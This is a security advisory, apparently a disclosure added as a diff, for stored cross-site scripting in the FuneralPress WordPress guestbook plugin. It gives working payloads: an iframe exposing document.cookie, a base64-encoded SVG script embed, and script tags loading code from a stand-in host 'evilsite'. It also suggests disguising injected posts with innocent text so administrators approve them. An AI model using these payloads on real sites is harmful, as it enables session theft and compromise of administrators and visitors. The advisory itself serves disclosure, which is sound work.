@@ -1,0 +1,125 @@
+#
+#
+# WP FuneralPress - stored xss in guestbook
+#
+# "FuneralPress is an online website obituary management and guest book
+program for funeral homes and cemeteries"
+# http://wpfuneralpress.com/
+#
+# tested on: funeralpress version 1.1.6 / wordpress version 3.5.1
+#
+# impact:
+#   malicious script execution as wordpress administrator
+#
+# author: robarmstrong.te71@gmail.com
+
+
+# summary
+
+A low-privilege or guest user can inject code via the
+<textareaname="photo-message">, <
+textarea name="youtube-message"> and <textarea name="message"> elements
+which are part of the wpfh_upload_form form in
+http://site/obituaries/?id=[ID]&f=guestbook&m=add
+
+Scripts injected via the "photo-message" and "youtube-message" elements
+will be executed by the admin user when they browse to the guestbook admin
+page at http://site/wp-admin/admin.php?page=wpfh-guestbook
+
+If a malicious post is approved by the admin, the script will be run by
+anyone viewing the guestbook.
+
+
+
+# details
+
+There appears to be some basic xss protection on form submissions using <
+textarea name="message"> and code injected via this element is not served
+up on the guestbook admin page.
+
+Despite this, scripts injected via an iframe or embedded svg will be
+executed by anyone viewing the guestbook at http://site/obituaries/?id=1&f=
+guestbook on the condition that the post is approved by the site
+administrator. The chances of an administrator approving a malicious
+message are increased if some normal-looking text is inserted above the
+malicious code, resulting in a legitimate looking "Message Preview" field
+on the admin page.
+
+## message post example:
+
+    1. Attacker browses to:
+http://site/obituaries/?id=1&f=guestbook&m=addand submits the form
+with the following entered into <
+textarea name="message" style="width:98%;height:170px" id="wpfh_message_
+textarea">&lt;/textarea&gt; :
+
+        Poor Peter was a fine old chap, such a pity he was eaten to death
+by a pack of wild children.
+
+        <IFRAME SRC="javascript:document.write('xss cookie: ' +
+document.cookie);"></IFRAME>
+
+        <EMBED SRC="data:image/svg+xml
+;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZW
+NtYXNjcmlwdCI+YWxlcnQoInhzcyBhbGVydCIpPC9zY3JpcHQ+PC9zdmc+Cg==" type="image/
+svg+xml" AllowScriptAccess="always"></EMBED>
+
+    2. Site administrator browses to http://site/wp-admin/admin.php?page=
+wpfh-guestbook, sees an entry with a message preview that reads "Poor Peter
+was a fine old chap..." and approves it.
+
+    3. Anyone browsing to http://site/obituaries/?id=1+&f=guestbook will
+execute the injected script
+
+
+
+The xss flaws in <textarea name="photo-message"> and <textarea
+name="youtube-message">
+are more serious, as scripts injected here are served up to the admin user
+when they attempt to approve the guestbook comments at http://site/wp
+-admin/admin.php?page=wpfh-guestbook
+
+As with the regular guestbook messages, if the admin approves a malicious
+photo or youtube message the script will be executed by anyone browsing to
+the guestbook.
+
+## photo/youtube post example:
+
+    1. Attacker hosts malicious javascript on another site:
+
+        http://evilsite/fp.js :
+            document.getElementById("topmenu").innerHTML="<h1>XSS</h1>";
+//rewrite admin page
+
+        http://evilsite/doc.js :
+            document.write("document.write XSS");alert("XSS");
+
+    2. Attacker browses to:
+http://site/obituaries/?id=1&f=guestbook&m=addand selects either the
+"Photo" or "
+Youtube" guestbook message option
+
+    3. If Photo was selected, the attacker enters a path to a local image
+in <input type="file" name="photo" id="wpfh_message_file">. Otherwise they
+enter a Youtube link into <input type="text" name="youtube"
+style="width:95%" id="wpfh_message_youtube" value="">
+
+    4. Depending on which type of message was selected, the attacker
+submits the form with the following entered into
+<textareastyle="width:100%;height:70px" name="photo-message"></
+textarea> or <textarea style="width:100%;height:70px" name="youtube
+-message">&lt;/textarea&gt; :
+
+        <SCRIPT SRC=http://evilsite/fp.js></SCRIPT>
+        <SCRIPT SRC=http://evilsite/doc.js></SCRIPT>
+
+    5. The site administrator browses to http://site/wp-admin/admin.php
+?page=wpfh-guestbook and the scripts that have been injected into <table
+class="wp-list-table widefat fixed posts" cellspacing="0"> are executed:
+
+        <td  style="background-color:#ffd1d1 !important" >
+            <a href="http://www.youtube.com/watch?v=tsLkL8DTHeg"
+target="_blank">View Video</a><br><SCRIPT SRC=http://evilsite/fp.js
+></SCRIPT>
+            <SCRIPT SRC=http://evilsite/doc.js></SCRIPT>
+        </td>
